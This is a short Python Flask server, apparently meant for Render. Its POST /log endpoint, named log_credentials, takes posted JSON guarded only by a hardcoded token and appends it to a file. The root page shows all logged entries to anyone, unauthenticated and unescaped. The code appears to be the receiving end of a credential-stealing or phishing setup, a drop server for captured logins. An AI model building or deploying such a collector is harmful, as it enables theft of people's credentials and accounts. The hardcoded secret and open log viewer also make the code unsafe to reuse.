import os
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# 1. Secret token to prevent spam
SECRET_TOKEN = "my-super-secret-token-12345"  # Change this!

# 2. Ensure logs.txt exists on startup
if not os.path.exists('logs.txt'):
    with open('logs.txt', 'w') as f:
        f.write("")

@app.route('/log', methods=['POST'])
def log_credentials():
    token = request.headers.get('X-Auth-Token')
    if token != SECRET_TOKEN:
        return jsonify({"error": "Unauthorized"}), 403
    
    data = request.json
    try:
        with open("logs.txt", "a") as f:
            f.write(f"{data}\n")
        return jsonify({"status": "logged"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    try:
        with open("logs.txt", "r") as f:
            logs = f.read()
        return f"<pre>{logs}</pre>"
    except FileNotFoundError:
        return "No logs yet."

if __name__ == '__main__':
    # Render sets a PORT environment variable. We must use it.
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
